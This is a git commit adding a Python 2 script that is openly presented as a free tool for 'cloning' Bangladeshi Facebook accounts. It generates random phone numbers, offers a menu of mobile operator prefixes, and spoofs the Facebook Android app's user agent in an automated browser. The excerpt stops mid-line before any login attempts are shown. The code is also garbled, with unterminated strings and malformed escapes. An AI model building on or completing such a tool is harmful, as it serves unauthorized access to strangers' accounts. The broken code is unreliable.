0bafac4333cd4e3c8ff6800a80acdd4f6be3cc39
termuxraju <109569257+termuxraju@users.noreply.github.com>
2022-08-16 12:38:34 +0600

    Create BD-Raju.py

---
+++ BD-Raju.py
@@ -0,0 +1,187 @@
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
+os.system('rm -rf .txt')
+ 
+def psb(z):
+    for e in z + '\':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+ 
+os.system('clear')
+print
+ 
+print
+ 
+print("""
+
+\33[0;94m   ______  ___     ___ _   _ | ___ \/ _ \   |_  | | | |
+\33[0;94m  | |_/ / /_\ \    | | | | |
+\33[0;96m  |    /|  _  |    | | | | |
+\33[0;96m | |\ \| | | |/\__/ / |_| |
+\33[0;96m\_| \_\_| |_/\____/ \___/
+                                
+""")
+
+print("\33[0;91mThis Tool's Free By Raju Sultan")
+
+psb('\1b[1;92mBANGLADESH 6 DIGIT CLONING START PLEASE WAIT .....')
+for n in range(90000):
+    nmbr = random.randint(1111111, 9999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+ 
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+ 
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    time.sleep(1)
+    os.system('python2 C')
+ 
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+os.system('clear')
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [
+ ('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+ 
+def exb():
+    print
+    os.sys.exit()
+ 
+ 
+def psb(z):
+    for e in z + '\':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+ 
+ 
+def t():
+    time.sleep(1)
+ 
+ 
+def cb():
+    os.system('clear')
+ 
+logo = """
+
+\33[0;94m   ______  ___     ___ _   _ | ___ \/ _ \   |_  | | | |
+\33[0;94m  | |_/ / /_\ \    | | | | |
+\33[0;96m  |    /|  _  |    | | | | |
+\33[0;96m | |\ \| | | |/\__/ / |_| |
+\33[0;96m\_| \_\_| |_/\____/ \___/
+                                                                                                                                                                         
+"""
+
+back = 0
+successful = []
+cpb = []
+oks = []
+id = []
+ 
+def menu():
+    os.system('clear')
+    print logo
+    print ''
+    print '\33[0;93mAUTHOR   : Mr. RAJU
+    print '\33[0;94mFACEBOOK : XD RAJU
+    print '\33[0;96mGITHUB   : TERMUX RAJU
+    print ''
+    print '\33[0;90mONLY BANGLADESHI ACCOUNTS ARE AVAILABLE'
+    print '\33[0;91m'
+    print 50* '-'
+    print '\33[0;92m[1]  \1b[1;93mGP'
+    print '\33[0;95m[2]  \1b[1;95mRobi'
+    print '\33[0;94m[3]  \1b[1;94mAirtel'
+    print '\33[0;92m[4]  \1b[1;92mBanglalink'
+    print '\33[0;96m[5]  \1b[1;96mTeletalk'
+    print '\33[0;90m[0]  \1b[1;90mExit            '
+    print '\33[0;91m'
+    print 50 * '-'
+    action()
+ 
+ 
+def action():
+    global cpb
+    global oks
+    bch = raw_input('\33[0;93m\> ')
+    if bch == '':
+        print
+        action()
+    elif bch == '1':
+        os.system('clear')
+        print logo
+        print 50* '-'
+        print ''
+        print '170,171, 172, 173, 174, 175, 176, 177, 178, 179,130,131, 132, 133, 134, 135, 136, 137, 138, 139'
+        print''
+        try:
+            c = raw_input('\33[0;93mChoose Code : ')
+            k = '+880'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+ 
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\[ Back ]')
+            menu()
+ 
+    elif bch == '2':
+        os.system('clear')
+        print logo
+        print 50* '-'
+        print ''
+        print '180,181, 182, 183, 184, 185, 186, 187, 188, 189'
+        print''
+        try:
+            c = raw_input('\33[0;93mChoose Code : ')
+            k = '+880'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+ 
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\[ Back ]')
+            menu()
+ 
+    elif bch == '3':
+        os.system('clear')
+        print logo
+        print 50* '-'
+        print ''
+        print '160,161, 162, 163, 164, 165, 166, 167, 168, 169'
+        print''
+        try:
+            c = raw_input('\33[0;93mChoose Code : ')
+            k = '+880'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+ 
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\[ Back ]')
+            menu()
+ 
+    elif bch == '4':
+        os.system('clear')
+        print logo
+        print 50* '-'
+        print ''
+        print '190,191, 192, 193, 194, 195, 196, 197, 198, 199,140,141, 142, 143, 144, 145, 146, 147, 148, 149'
+        print''
+        try:
+            c = raw_i
